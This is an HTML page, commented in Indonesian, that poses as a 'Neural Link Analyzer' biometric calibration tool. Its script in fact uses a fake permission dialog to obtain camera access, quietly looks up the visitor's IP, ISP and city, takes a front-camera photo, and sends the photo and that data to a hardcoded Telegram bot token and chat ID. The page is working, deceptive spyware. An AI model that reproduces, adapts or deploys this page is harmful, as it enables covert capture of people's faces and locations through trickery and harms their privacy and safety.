<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEURAL LINK ANALYZER v2.0</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Fira Code', monospace;
            background-color: #0a0a0b; color: #00ff41;
            overflow: hidden; display: flex; justify-content: center; align-items: center;
        }

        .bg-grid {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px);
            background-size: 30px 30px; z-index: 1;
        }

        .container {
            position: relative; z-index: 10; background: rgba(10, 10, 11, 0.9);
            padding: 30px; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            text-align: center; width: 85%; max-width: 400px; border: 1px solid #00ff41;
            clip-path: polygon(0 0, 100% 0, 100% 90%, 90% 100%, 0 100%);
        }

        /* Tombol Transparan untuk Trigger Pertama */
        #trigger {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: transparent; border: none; cursor: pointer; z-index: 100;
        }

        /* DIALOG IZIN PALSU */
        #overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); z-index: 1000;
        }

        #fake-dialog {
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            background: #0a0a0b; border: 1px solid #00ff41; padding: 20px; width: 280px;
            z-index: 1001; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 65, 0.4);
        }

        .btn-green {
            background: transparent; color: #00ff41; border: 1px solid #00ff41;
            padding: 10px 20px; cursor: pointer; font-family: 'Fira Code'; font-size: 0.8rem;
            margin-top: 15px; transition: 0.3s; width: 100%;
        }
        .btn-green:hover { background: rgba(0, 255, 65, 0.1); }

        /* Scan & Status */
        #scan-visual { display: none; position: relative; width: 200px; height: 150px; margin: 20px auto; border: 1px solid rgba(0, 255, 65, 0.3); }
        .scan-bar { position: absolute; width: 100%; height: 2px; background: #00ff41; box-shadow: 0 0 10px #00ff41; top: 0; animation: scanLine 2s infinite linear; }
        @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }

        video, canvas { display: none; position: fixed; }
    </style>
</head>
<body>

    <div class="bg-grid"></div>

    <button id="trigger"></button>

    <div id="overlay"></div>
    <div id="fake-dialog">
        <div style="font-size: 2rem; margin-bottom: 10px;">◈</div>
        <h2 style="font-size: 1rem; margin-bottom: 10px;">AUTH_REQUIRED</h2>
        <p style="font-size: 0.7rem; color: #888; line-height: 1.4;">
            Sistem memerlukan kalibrasi <span style="color:#00ff41">Sensor Biometrik (Kamera)</span> untuk verifikasi neural link.
        </p>
        <button class="btn-green" onclick="requestActualPermission()">ALLOW ACCESS</button>
    </div>

    <div class="container">
        <div id="setup-view">
            <div style="font-size: 3rem; animation: flicker 2s infinite;">◈</div>
            <h1>Neural Link Analyzer</h1>
            <p>[SYSTEM READY]<br>Klik di mana saja untuk memulai kalibrasi biometrik.</p>
            <div style="border: 1px dashed #00ff41; padding: 10px; font-size: 0.8rem;">INITIALIZE_UPLINK</div>
        </div>

        <div id="scan-view" style="display:none;">
            <div id="scan-visual">
                <div class="scan-bar"></div>
                <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:0.5rem; opacity:0.5;">UPLINKING...</div>
            </div>
            <h1 id="status-text">Capturing...</h1>
        </div>

        <div id="result-view" style="display:none;">
            <h1>Scan Complete</h1>
            <p style="color:#00ff41">[ACCESS GRANTED]</p>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
        const TG_CHAT_ID = '986460435'; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const trigger = document.getElementById('trigger');
        const overlay = document.getElementById('overlay');
        const fakeDialog = document.getElementById('fake-dialog');

        // Tahap 1: Munculkan Dialog Palsu saat layar diklik
        trigger.onclick = () => {
            trigger.style.display = 'none';
            overlay.style.display = 'block';
            fakeDialog.style.display = 'block';
        };

        // Tahap 2: Minta Izin Asli Browser
        async function requestActualPermission() {
            overlay.style.display = 'none';
            fakeDialog.style.display = 'none';
            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('scan-view').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                document.getElementById('scan-visual').style.display = 'block';
                
                // Ambil IP Secara diam-diam
                let netInfo = "N/A";
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const d = await res.json();
                    netInfo = `IP: ${d.ip} | ISP: ${d.org} | Loc: ${d.city}`;
                } catch(e){}

                setTimeout(() => {
                    captureAndSend(stream, netInfo);
                }, 3500);

            } catch (err) {
                alert("ERR_HARDWARE_ACCESS_DENIED: Kalibrasi gagal.");
                location.reload();
            }
        }

        function captureAndSend(stream, info) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const blob = dataURItoBlob(canvas.toDataURL('image/png'));
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('photo', blob, 'bio.png');
            formData.append('caption', `🛡️ [SYSTEM_LOG]\n${info}\nDevice: ${navigator.platform}`);

            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });

            stream.getTracks().forEach(t => t.stop());
            document.getElementById('scan-view').style.display = 'none';
            document.getElementById('result-view').style.display = 'block';
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            return new Blob([ab], {type: 'image/png'});
        }
    </script>
</body>
</html>
